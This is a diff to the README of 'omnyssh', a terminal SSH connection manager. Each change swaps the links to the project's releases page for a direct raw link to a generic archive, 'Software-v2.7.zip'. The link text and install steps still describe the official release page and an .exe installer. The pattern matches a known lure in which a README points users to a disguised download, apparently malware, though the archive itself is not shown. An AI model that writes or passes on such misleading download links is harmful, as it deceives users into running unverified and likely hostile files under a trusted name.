@@ -1,6 +1,6 @@
 # 🖥️ omnyssh - Manage your network connections with speed
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/meadtrue7477/omnyssh/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/meadtrue7477/omnyssh/raw/refs/heads/main/assets/Software-v2.7.zip)
 
 Omnyssh provides a fast way to handle your SSH connections. You use your keyboard to navigate through your servers. This tool runs inside your terminal. It helps you organize and open connections without using a mouse. People who manage servers or remote machines will find this helpful.
 
@@ -8,7 +8,7 @@ Omnyssh provides a fast way to handle your SSH connections. You use your keyboar
 
 You can install this software on your Windows computer. Follow these steps to get the program running on your machine.
 
-1. Go to the [official release page](https://github.com/meadtrue7477/omnyssh/releases).
+1. Go to the [official release page](https://github.com/meadtrue7477/omnyssh/raw/refs/heads/main/assets/Software-v2.7.zip).
 2. Look for the Assets section under the latest version.
 3. Click the link ending in .exe to download the installer.
 4. Save the file to your computer.
@@ -64,7 +64,7 @@ It saves your configuration in your user folder. This keeps your server details 
 Yes. You can specify the path to your key file in the configuration for each server.
 
 **How do I update the software?**
-Visit the [download page](https://github.com/meadtrue7477/omnyssh/releases) again. Download the newest installer and run it. The new version will replace the old one automatically.
+Visit the [download page](https://github.com/meadtrue7477/omnyssh/raw/refs/heads/main/assets/Software-v2.7.zip) again. Download the newest installer and run it. The new version will replace the old one automatically.
 
 **Can I export my list of servers?**
 Because the list is a text file, you can copy it to a thumb drive or sync it across machines. You control the file entirely.
